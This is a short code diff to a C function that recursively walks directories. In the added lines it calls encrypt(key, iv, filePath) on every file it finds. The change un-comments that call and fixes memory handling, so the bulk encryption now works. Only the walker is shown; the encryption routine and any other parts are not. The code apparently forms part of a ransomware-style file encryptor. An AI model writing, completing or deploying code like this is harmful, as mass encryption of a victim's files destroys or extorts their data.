@@ -50,11 +50,12 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
         {
             //printf("%s\n", dirp->d_name);
             char *newPath = (char*)malloc(strlen(name)+strlen(dirp->d_name)+2);
-            strncat(newPath,name,strlen(name));
+            strcpy(newPath,name);
             strncat(newPath,"/",2);
             strncat(newPath,dirp->d_name,strlen(dirp->d_name));
             //printf("%s\n", newPath);
             listdir(newPath,iv, key, 'e');
+            free(newPath);
             
             
             
@@ -63,12 +64,12 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
         {
 
             char *filePath = (char*)malloc(strlen(name)+strlen(dirp->d_name)+2);
-            strncat(filePath,name,strlen(name));
+            strcpy(filePath,name);
             strncat(filePath,"/",2);
             strncat(filePath,dirp->d_name,strlen(dirp->d_name));
             printf("%s\n",filePath);
-            //encrypt(key, iv, filePath);
-            //free(filePath);
+            encrypt(key, iv, filePath);
+            free(filePath);
             
 
             
